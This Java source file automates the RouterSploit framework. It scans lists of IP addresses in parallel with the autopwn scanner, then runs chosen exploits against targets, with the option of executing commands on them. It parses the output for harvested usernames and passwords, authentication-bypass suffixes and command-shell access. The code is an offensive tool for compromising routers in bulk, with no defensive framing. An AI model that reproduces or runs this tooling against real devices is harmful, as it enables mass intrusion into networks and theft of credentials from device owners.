package com.glezo.executableInterfaces.rsf;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import com.glezo.ipv4.Ipv4;
import com.glezo.stringUtils.StringUtils;
import com.glezo.systemCommandExecutor.SystemCommandExecutor;

public class RSF 
{
	//------------------------------------------------------------------------------------------------------
	public static RSF_Scanner_Result				scanner(int ith,int total,Ipv4 ip,String scanner)
	{
		ArrayList<String> exploits_vulnerable_to=new ArrayList<String>();
		
		SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		ArrayList<String> command=new ArrayList<String>();
		command.add("/root/rsf/routersploit/rsf_auto.sh");
		command.add("use");
		if(scanner==null)
		{
			command.add("scanners/autopwn");
		}
		else
		{
			command.add(scanner);
		}
		command.add("target");
		command.add(ip.toString());
		SystemCommandExecutor sce=new SystemCommandExecutor(command);
		System.out.println(sdf.format(new Date())+" "+ith+"/"+total+"\t"+sce.getExecutedCommand());
		try 
		{
			sce.executeCommand();
		} 
		catch (IOException e)				{}
		catch (InterruptedException e)		{}
		String output[]=sce.getStandardOutputFromCommand_string_clean_lines();
		int state=0;
		for(int i=0;i<output.length;i++)
		{
			String line=output[i];
			if(state==0 && line.contains("[*] Running module"))
			{
				state=1;
			}
			else if(state==1 && (line.contains("[*] Elapsed time") || line.contains(" > exit")))
			{
				state=2;
			}
			else if(state==1)
			{
				//if(!line.equals("") && !line.startsWith(" - ") && !line.startsWith("[-]") && !line.contains("could not be verified"))
				if(line.startsWith("[+]") && !line.equals("[+] Device is vulnerable!"))
				{
					exploits_vulnerable_to.add(StringUtils.true_trim(line.replace("[+] ","").replace("is vulnerable","")));
				}
			}
		}
		return new RSF_Scanner_Result(ip,exploits_vulnerable_to);
	}
	//------------------------------------------------------------------------------------------------------
	public static ArrayList<RSF_Scanner_Result>		parallel_scanner(ArrayList<Ipv4> ips,String scanner)
	{
		ArrayList<RSF_Scanner_Result> result=new ArrayList<RSF_Scanner_Result>();
		
		int numThreads = (int) (ips.size() > 8 ? 8 : ips.size());
		//0 ips to scan. Just set it to 1, no work shall be perfomed.
		if(numThreads==0)	{	numThreads=1;	}
		ExecutorService executor = Executors.newFixedThreadPool(numThreads);
		CompletionService<RSF_Scanner_Result> completionService = new ExecutorCompletionService<RSF_Scanner_Result>(executor);
		for(int i=0;i<ips.size();i++)
		{
			Ipv4 current_ip=ips.get(i);
			RSF_Scanner_Task task=new RSF_Scanner_Task(i,ips.size(),current_ip,scanner);
			completionService.submit(task); 
		}
		for(int i=0;i<ips.size();i++)
		{
			Future<RSF_Scanner_Result> future;
			try 
			{
				future = completionService.take();
				RSF_Scanner_Result current=future.get();
				if(current!=null)
				{
					result.add(current);
				}
			} 
			catch (InterruptedException e) 
			{
				e.printStackTrace();
			} 
			catch (ExecutionException e) 
			{
				e.printStackTrace();
			}
		}		
		return result;
	}
	//------------------------------------------------------------------------------------------------------
	public static RSF_Retrieved_Info				attack(Ipv4 ip,String exploit,Integer port,String command_to_execute)
	{
		ArrayList<String> result=new ArrayList<String>();

		SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		ArrayList<String> command=new ArrayList<String>();
		command.add("/root/rsf/routersploit/rsf_auto.sh");
		command.add("use");
		command.add(exploit);
		command.add("target");
		command.add(ip.toString());
		if(port!=null)
		{
			command.add("port");
			command.add(Integer.toString(port));
		}
		if(command_to_execute!=null)
		{
			command.add("command");
			command.add(command_to_execute);
		}
		SystemCommandExecutor sce=new SystemCommandExecutor(command);
		System.out.println("\t"+sdf.format(new Date())+" "+sce.getExecutedCommand());
		try 
		{
			sce.executeCommand();
		} 
		catch (IOException e)				{}
		catch (InterruptedException e)		{}
		String output[]			=sce.getStandardOutputFromCommand_string_clean_lines();

		String auth_bypass_suffix=null;
		
		if(command_to_execute==null)
		{
			for(int i=0;i<output.length;i++)
			{
				String current_line=output[i];
				if(current_line.contains("You need to add"))
				{
					auth_bypass_suffix="?"+current_line.split("You need to add ")[1].split(" ")[0];
				}
			}
		}
		
		//synchronization between expect and rsf is a bet messy... so is this:
		ArrayList<String> command_output=null;new ArrayList<String>();
		String command_container_line=null;
		if(command_to_execute!=null)
		{
			command_output=new ArrayList<String>();
			for(int i=0;i<output.length;i++)
			{
				String current_line=output[i];
				if(current_line.contains(command_to_execute))
				{
					command_container_line=current_line;
				}
				else if(command_container_line!=null)
				{
					//return itself
					if(current_line.contains("[*] Invoking command loop...")) //could appear, indeed, after the command
					{
					}
					else if(current_line.contains("[+] Target is vulnerable")) //could appear, indeed, after the command
					{
					}
					else
					{
						if(current_line.equals("cmd > exit"))
						{
							break;
						}
						else if(command_output.size()==0 && current_line.equals(""))
						{
						}
						else if(command_output.size()==0 && current_line.startsWith(">"))
						{
							current_line=current_line.substring(1);
							if(!current_line.equals("exit"))
							{
								command_output.add(current_line);
							}
						}
						else if(command_output.size()==0 && current_line.equals("exit"))
						{
						}
						else
						{
							command_output.add(current_line);
						}
					}
				}
			}
		}
		
		int state=0;
		boolean got_cmd=false;
		boolean blind_injection=false;
		for(int i=0;i<output.length;i++)
		{
			String line=output[i];
			if(line.contains("[*] It is blind command injection"))	{		blind_injection=true;	}
			if(line.contains("cmd >") && !blind_injection)			{		got_cmd=true;			}
			if(state==0 && line.contains("[*] Running module"))		{		state=1;				}
			else if(state==1 && line.contains("> exit"))			{		state=2;				}
			else if(state==1)
			{
				if(line.trim().length()>0)	{	result.add(line);	}
			}
		}
		
		//now, let's analyze and parse the output
		String user=null;
		String pass=null;
		state=0;
		String header_line=null;
		for(int i=0;i<result.size();i++)
		{
			String current_line=result.get(i);
			if(current_line.contains("cmd >") && !blind_injection)
			{
				got_cmd=true;
			}
			if(current_line.contains("Credentials found"))
			{
				state=1;
			}
			else if(state==1)	{	state=2;	header_line=current_line;	}
			else if(state==2)	{	state=3;								}
			else if(state==3)
			{
				//lets parse the header to retrieve the begin/end every for each token
				ArrayList<Integer> begin=new ArrayList<Integer>();
				int sub_state=0;
				for(int j=0;j<header_line.length();j++)
				{
					char c=header_line.charAt(j);
					if(sub_state==0 && c==' ')		{								}
					else if(sub_state==0 && c!=' ')	{sub_state=1;	begin.add(j);	}
					else if(sub_state==1 && c!=' ')	{								}
					else if(sub_state==1 && c==' ')	{sub_state=0;					}
				}
				user	=StringUtils.true_trim(current_line.substring(begin.get(0),begin.get(1)));
				pass	=StringUtils.true_trim(current_line.substring(begin.get(1)));
			}
		}
		
		//purge empty line at the beginning. messy, ghetto.
		if(command_output!=null && command_output.size()>0 && command_output.get(0).equals(""))
		{
			command_output.remove(0);
		}
		if(command_output!=null && command_output.size()>0 && command_output.get(0).contains("Target is vulnerable"))
		{
			command_output.remove(0);
		}
		if(command_output!=null && command_output.size()>0 && command_output.get(0).contains("Invoking command loop..."))
		{
			command_output.remove(0);
		}
		
		return new RSF_Retrieved_Info(user,pass,auth_bypass_suffix,got_cmd,command_output);
	}
	//------------------------------------------------------------------------------------------------------
}
